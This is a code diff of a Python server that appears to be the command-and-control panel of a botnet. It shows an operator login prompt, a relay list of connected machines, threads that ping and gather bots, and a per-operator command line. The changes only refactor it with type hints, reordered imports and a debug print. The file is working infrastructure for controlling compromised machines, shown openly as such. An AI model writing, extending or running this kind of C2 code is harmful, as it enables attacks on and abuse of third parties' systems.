@@ -1,13 +1,14 @@
 #!/usr/bin/python3
 
-import hashlib
-from socket import socket as Sock
-from socket import SOL_SOCKET, SO_KEEPALIVE, SO_REUSEADDR
-from threading import Thread
 from sys import argv, exit
 import time
-from colorama import Fore, init as colorama_init
+from typing import Any
+from threading import Thread
+from socket import socket as Sock
+from socket import SOL_SOCKET, SO_KEEPALIVE, SO_REUSEADDR
+import hashlib
 from requests import get as rget
+from colorama import Fore, init as colorama_init
 from modules.config import C2Config
 from modules.loops import Loops
 from modules.client import Client
@@ -73,7 +74,10 @@ def find_login(
     return res == "ok"
 
 
-def handle_client(client, address) -> None:
+def handle_client(
+    client: Sock,
+    address: tuple[str, int],
+) -> None:
     while 1:
         send(client, config.ANSI_CLEAR, False)
         send(client, f'{config.COLOR_WHITE}Username > ', False)
@@ -96,7 +100,7 @@ def handle_client(client, address) -> None:
         send(client, config.ANSI_CLEAR, False)
 
         if not find_login(username, password):
-            send(client, f'{config.COLOR_RED}[{config.COLOR_WHITE}!{config.COLOR_RED}]{config.COLOR_RESET} Invalid credentials')
+            send(client, 'Invalid credentials!')
             time.sleep(1)
             client.close()
             return
@@ -105,18 +109,17 @@ def handle_client(client, address) -> None:
 
         Thread(target=client_loops.update_title, args=[client, username],).start()
         Thread(target=client_loops.command_line, args=[client, username],).start()
-        
+
     else:
-        for x in config.relay_list.values():
-            if x[0] == address[0]:
+        for addr in config.relay_list.values():
+            print("already knewed relay:", addr)
+            if addr[0] == address[0]: # so same ips
                 client.close()
                 return
 
         config.relay_list.update({client: address})
 
-
-
-def main():
+def main() -> None:
     port: int = None
 
     if config.cnc_addr.CNC_PORT != None : port = config.cnc_addr.CNC_PORT
@@ -145,8 +148,7 @@ def main():
 
     loops: Loops = Loops(config=config)
 
-    if loops.relay_api({'ip': '', 'bots': ''}, True):
-        pass
+    if loops.relay_api({'ip': '', 'bots': ''}, True): pass
     else:
         log('Failed to relay api')
         exit()
@@ -156,7 +158,6 @@ def main():
     Thread(target=loops.ping).start()
     Thread(target=loops.net).start()
     Thread(target=loops.getbot).start()
-
 
     while 1: Thread(target=handle_client, args=[*s.accept()]).start()
 
